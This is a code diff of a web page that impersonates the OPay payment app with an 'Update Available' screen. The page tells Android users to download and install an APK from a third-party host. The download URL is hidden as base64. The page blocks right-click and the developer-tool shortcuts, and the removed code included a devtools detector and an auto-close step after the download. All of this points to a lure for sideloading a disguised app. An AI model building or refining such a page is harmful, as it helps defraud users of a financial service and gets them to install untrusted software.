@@ -3,22 +3,22 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    
+
     <!-- Essential PWA + Favicon Meta Tags -->
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
     <meta name="mobile-web-app-capable" content="yes" />
     <meta name="theme-color" content="#1DCF9F" />
-    
+
     <!-- Favicon Links -->
     <link rel="icon" href="favicon.ico" type="image/x-icon" />
     <link rel="icon" href="favicon-16x16.png" sizes="16x16" type="image/png" />
     <link rel="icon" href="favicon-32x32.png" sizes="32x32" type="image/png" />
     <link rel="apple-touch-icon" href="opay-icon-180.png" />
-    
+
     <!-- Manifest -->
     <link rel="manifest" href="manifest.json" />
-    
+
     <title>OPay Plus – Update Available</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet" />
     <style>
@@ -628,7 +628,8 @@
         }
 
         @keyframes blink {
-            0%, 100% { opacity: 1; }
+            0%,
+            100% { opacity: 1; }
             50% { opacity: 0.4; }
         }
 
@@ -733,20 +734,18 @@
 
     <!-- ─── LOADING OVERLAY ─── -->
     <div id="loading">
-        <!--<div class="spinner"></div>
-        <p>Loading OPay Plus…</p>--->
+        <!-- hidden by default -->
     </div>
 
     <!-- ─── MAIN CONTENT ─── -->
     <div class="opay-card" id="appContainer">
 
         <!-- ════════════════════════════════════════════════ -->
-        <!--  ANDROID / DEFAULT VIEW  (full update card)     -->
+        <!--  ANDROID VIEW  (full update card)               -->
         <!-- ════════════════════════════════════════════════ -->
         <div id="androidView">
             <div class="card-header">
                 <div class="logo-wrap">
-                    <!-- Android logo: using the provided image link -->
                     <img src="https://iili.io/Cc8lLHF.png" alt="OPay Plus Logo" />
                 </div>
                 <h1>Update Available</h1>
@@ -927,50 +926,36 @@
     </div>
 
     <script>
-        // ===== EARLY STANDALONE CHECK – REDIRECT TO INTRO IMMEDIATELY =====
+        // ================================================================
+        // EARLY STANDALONE CHECK – redirect to intro.html when opened
+        // from the iOS home screen (standalone mode).
+        // ================================================================
         (function() {
             'use strict';
-            
-            // Detect standalone mode (added to home screen)
+
             function isStandalone() {
                 return (
                     ('standalone' in window.navigator && window.navigator.standalone) ||
                     window.matchMedia('(display-mode: standalone)').matches
                 );
             }
-            
-            // If standalone, redirect to intro.html immediately (before any DOM work)
+
             if (isStandalone()) {
                 window.location.replace('intro.html');
                 return; // stop execution
             }
         })();
 
-        // ===== MAIN SCRIPT (only runs when NOT in standalone mode) =====
+        // ================================================================
+        // MAIN SCRIPT – device detection & UI logic (no devtools detection)
+        // ================================================================
         (function() {
             'use strict';
 
-            // --- Anti-debugging: detect DevTools ---
-            function detectDevTools() {
-                var threshold = 160;
-                var widthThreshold = window.outerWidth - window.innerWidth > threshold;
-                var heightThreshold = window.outerHeight - window.innerHeight > threshold;
-                if (widthThreshold || heightThreshold) {
-                    document.body.innerHTML = '';
-                    window.location.replace('about:blank');
-                }
-            }
-            setInterval(detectDevTools, 1000);
-
-            // --- Prevent right-click ---
-            document.addEventListener('contextmenu', function(e) {
-                e.preventDefault();
-                return false;
-            });
-
-            // --- Prevent keyboard shortcuts ---
+            // --- Prevent right-click & shortcuts (basic) ---
+            document.addEventListener('contextmenu', function(e) { e.preventDefault(); return false; });
             document.addEventListener('keydown', function(e) {
-                if (e.key === 'F12' || 
+                if (e.key === 'F12' ||
                     (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
                     (e.ctrlKey && e.key === 'U')) {
                     e.preventDefault();
@@ -978,18 +963,13 @@
                 }
             });
 
-            // --- Base64 encoded sensitive strings ---
+            // --- Base64 encoded strings ---
             var _0x = {
-                // New APK URL encoded in Base64
-                apk: 'aHR0cHM6Ly9mbGFzaHgxLm5hbWUubmcvYXBpLWRvd25sb2FkL09QYXkrcGx1cy5hcGs=',
-                intro: 'aW50cm8uaHRtbA==',
-                dummy: 'V2UncmUgcmVhZHkgZm9yIGFueXRoaW5n'
+                apk: 'aHR0cHM6Ly9vcGF5cGx1cy52ZXJjZWwuYXBwL2Rvd25sb2FkL3Y4L09QYXkrUGx1cy5hcGs=',
+                intro: 'aW50cm8uaHRtbA=='
             };
 
-            function decode(s) {
-                return atob(s);
-            }
-
+            function decode(s) { return atob(s); }
             var APK_URL = decode(_0x.apk);
             var INTRO_PAGE = decode(_0x.intro);
 
@@ -1007,28 +987,23 @@
             var iosRefreshBtn = document.getElementById('iosRefreshBtn');
             var fallbackAndroidBtn = document.getElementById('fallbackAndroidBtn');
 
-            // ─── Device detection ─────────────────────────────────────
+            // ─── Device detection (case‑insensitive, robust) ──────
             function isIOS() {
                 return /iPad|iPhone|iPod/.test(navigator.userAgent) ||
                     (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
             }
 
             function isAndroid() {
-                return /Android/.test(navigator.userAgent);
-            }
-
-            function isWebView() {
-                var ua = navigator.userAgent.toLowerCase();
-                return ua.indexOf('wv') !== -1 || 
-                       (isAndroid() && ua.indexOf('; wv') !== -1) ||
-                       (typeof window.Android !== 'undefined') ||
-                       (navigator.userAgent.indexOf('Version/') !== -1 && navigator.userAgent.indexOf('Safari/') === -1);
+                return /Android/i.test(navigator.userAgent);
             }
 
             // ─── Show platform-specific content ────────────────────
             function showPlatformContent() {
                 var deviceIsIOS = isIOS();
                 var deviceIsAndroid = isAndroid();
+
+                // Log for debugging (visible in browser console)
+                console.log('[OPay+] Device detection: iOS=' + deviceIsIOS + ', Android=' + deviceIsAndroid);
 
                 if (deviceIsIOS) {
                     androidView.classList.add('hidden');
@@ -1045,15 +1020,10 @@
                 }
             }
 
-            function setDynamicGuide() {
-                console.log('[OPay+] Dynamic guide set.');
-            }
-
             // ─── INIT ──────────────────────────────────────────────────
             function init() {
-                loadingEl.style.display = 'none';
+                if (loadingEl) loadingEl.style.display = 'none';
                 showPlatformContent();
-                setDynamicGuide();
             }
 
             // ─── iOS: Refresh button ──────────────────────────────────
@@ -1071,8 +1041,9 @@
                 });
             }
 
-            // ─── Android: open in external browser ───────────────────
+            // ─── Open URL in external browser (no blank page) ──────
             function openInExternalBrowser(url) {
+                // Try native intent on Android
                 if (window.Intent && window.Intent.ACTION_VIEW) {
                     try {
                         var intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
@@ -1081,6 +1052,7 @@
                     } catch (_) { /* fall through */ }
                 }
 
+                // Standard approach: open in new tab/window
                 var a = document.createElement('a');
                 a.href = url;
                 a.target = '_blank';
@@ -1088,19 +1060,15 @@
                 a.style.display = 'none';
                 document.body.appendChild(a);
                 a.click();
+
                 setTimeout(function() {
-                    document.body.removeChild(a);
-                }, 100);
+                    if (a.parentNode) document.body.removeChild(a);
+                }, 200);
+
                 return true;
             }
 
-            function closeCurrentApp() {
-                window.close();
-                setTimeout(function() {
-                    window.location.href = 'about:blank';
-                }, 800);
-            }
-
+            // ─── Android: start update ──────────────────────────────
             function startUpdate() {
                 if (!statusDiv) return;
                 statusDiv.innerHTML = '🚀 Opening browser for download… The APK will start automatically.';
@@ -1112,7 +1080,6 @@
                 setTimeout(function() {
                     statusDiv.innerHTML = '✅ Download started in your browser. Please install the new APK.';
                     if (manualBtn) manualBtn.style.display = 'block';
-                    closeCurrentApp();
                 }, 2000);
             }
 
@@ -1120,9 +1087,6 @@
                 if (!statusDiv) return;
                 statusDiv.innerHTML = '📲 Opening browser for APK download…';
                 openInExternalBrowser(APK_URL);
-                setTimeout(function() {
-                    closeCurrentApp();
-                }, 1500);
             }
 
             // ─── Android event listeners ──────────────────────────────
@@ -1159,16 +1123,18 @@
             // ─── Run init ─────────────────────────────────────────────
             init();
 
-            // ─── Additional obfuscation: dummy function ──────────────
-            function _dummy() {
-                var x = 'dummy';
-                return x.split('').reverse().join('');
-            }
-            _dummy();
+            // ─── Expose API for network-popup.js ─────────────────────
+            window.__OPAY = {
+                APK_URL: APK_URL,
+                INTRO_PAGE: INTRO_PAGE,
+                isIOS: isIOS,
+                isAndroid: isAndroid,
+                openInExternalBrowser: openInExternalBrowser
+            };
 
         })();
     </script>
-    <!-- Removed pwa-check.js to avoid conflict, standalone handled above -->
+    <!-- network-popup.js (kept as is) -->
     <script src="/network-popup.js"></script>
 </body>
 </html>
